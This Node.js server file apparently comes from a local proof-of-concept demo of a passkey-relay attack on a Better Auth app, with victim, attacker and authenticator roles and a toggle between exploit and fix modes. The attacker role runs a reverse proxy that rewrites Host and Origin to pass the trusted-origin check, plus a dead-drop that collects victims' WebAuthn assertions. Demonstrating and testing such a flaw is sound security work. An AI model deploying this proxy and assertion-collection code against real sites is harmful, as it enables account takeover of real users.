// One Better Auth app, three roles, one toggle. The `dpop` plugin (./dpop-plugin.mjs) adds the
// sender-constraining WebAuthn extension; DPOP_ENFORCE flips exploit vs fix (see auth.mjs).
//
//   ROLE=victim        PORT=5411  Acme on victim.localhost: /login, Better Auth at /api/auth.
//   ROLE=attacker      PORT=5413  attacker.localhost: /attacker + dead-drop, and an /api/auth proxy
//                                 to the victim Better Auth (Host/Origin rewritten).
//   ROLE=authenticator PORT=5415  authenticator.localhost: the simulated extended authenticator
//                                 (separate origin, embedded as an iframe by the RP page).
//
// victim/attacker/authenticator are different hosts, so the attacker gets its own cookie jar and the
// authenticator's keys sit on an origin the RP page cannot read. All resolve to 127.0.0.1 in the
// browser. Authorized demo use only: your own machine and disposable test users.
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROLE = ['attacker', 'authenticator'].includes(process.env.ROLE) ? process.env.ROLE : 'victim';
const PORT = Number(process.env.PORT || ({ victim: 5411, attacker: 5413, authenticator: 5415 }[ROLE]));
const VICTIM_ORIGIN = process.env.VICTIM_ORIGIN || process.env.BA_BASEURL || 'http://victim.localhost:5411';
const RP_HOST = new URL(VICTIM_ORIGIN).host;
const __dirname = path.dirname(fileURLToPath(import.meta.url));

const readBody = (req) => new Promise((r) => { let d = ''; req.on('data', (c) => (d += c)); req.on('end', () => r(d)); });
const json = (res, code, body) => { res.writeHead(code, { 'content-type': 'application/json', 'cache-control': 'no-store' }); res.end(JSON.stringify(body)); };
async function serveFile(res, file, type = 'text/html; charset=utf-8') {
  let buf; try { buf = await readFile(path.join(__dirname, 'public', file)); } catch { return json(res, 404, { error: 'not found' }); }
  res.writeHead(200, { 'content-type': type, 'cache-control': 'no-store' }); res.end(buf);
}
const cors = (res) => {
  res.setHeader('access-control-allow-origin', VICTIM_ORIGIN);
  res.setHeader('access-control-allow-methods', 'GET,POST,OPTIONS');
  res.setHeader('access-control-allow-headers', 'content-type,authorization,x-dpop-proof');
  res.setHeader('access-control-allow-credentials', 'true');
};

// Attacker reverse proxy to the victim's Better Auth, Host/Origin rewritten so the trusted-origin
// check passes. Connect over loopback so Node need not resolve the *.localhost name.
function proxy(req, res) {
  const target = new URL(VICTIM_ORIGIN);
  const headers = { ...req.headers, host: RP_HOST };
  if (headers.origin) headers.origin = VICTIM_ORIGIN;
  if (headers.referer) headers.referer = VICTIM_ORIGIN + '/';
  const p = http.request({ host: '127.0.0.1', port: target.port, method: req.method, path: req.url, headers }, (pr) => { res.writeHead(pr.statusCode, pr.headers); pr.pipe(res); });
  p.on('error', () => json(res, 502, { error: 'victim unreachable' }));
  req.pipe(p);
}

// Attacker dead-drop: one offered challenge, and the assertions victims drop.
let offer = null; const drops = [];
async function deadDrop(req, res, pth) {
  if (pth === '/x/offer' && req.method === 'POST') { const b = JSON.parse((await readBody(req)) || '{}'); if (!b.publicKey) return json(res, 400, { error: 'no publicKey' }); offer = { ...b, at: Date.now() }; cors(res); return json(res, 200, { ok: true }); }
  if (pth === '/x/offer' && req.method === 'GET') { cors(res); return json(res, 200, offer || {}); }
  if (pth === '/x/assertion' && req.method === 'POST') { const b = JSON.parse((await readBody(req)) || '{}'); if (!b.assertion) return json(res, 400, { error: 'no assertion' }); drops.push({ ...b, at: Date.now() }); cors(res); return json(res, 200, { ok: true }); }
  if (pth === '/x/assertion' && req.method === 'GET') { cors(res); return json(res, 200, drops.shift() || {}); }
  if (pth === '/x/reset' && req.method === 'POST') { offer = null; drops.length = 0; cors(res); return json(res, 200, { ok: true }); }
  cors(res); return json(res, 404, { error: 'not found' });
}

async function start() {
  let authHandler = null;
  if (ROLE === 'victim') {
    const { auth } = await import('./auth.mjs');
    const { toNodeHandler } = await import('better-auth/node');
    authHandler = toNodeHandler(auth);
  }

  const server = http.createServer(async (req, res) => {
    const pth = new URL(req.url, 'http://localhost').pathname;

    if (ROLE === 'authenticator') {
      if (pth === '/' || pth === '/auth') return serveFile(res, 'authenticator.html');
      return json(res, 404, { error: 'not found' });
    }

    if (ROLE === 'attacker') {
      if (req.method === 'OPTIONS' && pth.startsWith('/x/')) { cors(res); res.writeHead(204); return res.end(); }
      if (pth === '/' || pth === '/attacker') return serveFile(res, 'attacker.html');
      if (pth === '/passkey-provider.js') return serveFile(res, 'passkey-provider.js', 'text/javascript');
      if (pth.startsWith('/x/')) return deadDrop(req, res, pth);
      return proxy(req, res); // /api/auth/* -> victim Better Auth
    }

    // ---- victim RP ----
    // The dpop flow pins the WebAuthn clientData origin to victim.localhost; a page loaded on the
    // old localhost URL would fail at login, so redirect wrong-host page loads to the canonical host.
    if (req.method === 'GET' && req.headers.host !== RP_HOST && (pth === '/' || pth === '/login')) {
      res.writeHead(302, { location: `${VICTIM_ORIGIN}/login` });
      return res.end();
    }
    if (pth.startsWith('/api/auth')) return authHandler(req, res);
    if (pth === '/passkey-provider.js') return serveFile(res, 'passkey-provider.js', 'text/javascript');
    if (pth === '/') { res.writeHead(302, { location: '/login' }); return res.end(); }
    if (pth === '/login') return serveFile(res, 'login.html');
    return json(res, 404, { error: 'not found' });
  });

  server.on('error', (e) => {
    if (e.code === 'EADDRINUSE') {
      console.error(`Port ${PORT} is already in use - an earlier demo server is probably still running on it.`);
      console.error(`Stop it and retry:  pkill -f betterauth-dpop   (or free port ${PORT} yourself)`);
      process.exit(1);
    }
    throw e;
  });

  const HOST = { victim: 'victim.localhost', attacker: 'attacker.localhost', authenticator: 'authenticator.localhost' }[ROLE];
  server.listen(PORT, () => {
    if (process.env.QUIET === '1') return;
    console.log(`betterauth-dpop ${ROLE} on http://${HOST}:${PORT}  (RP ${VICTIM_ORIGIN})`);
  });
}
start();
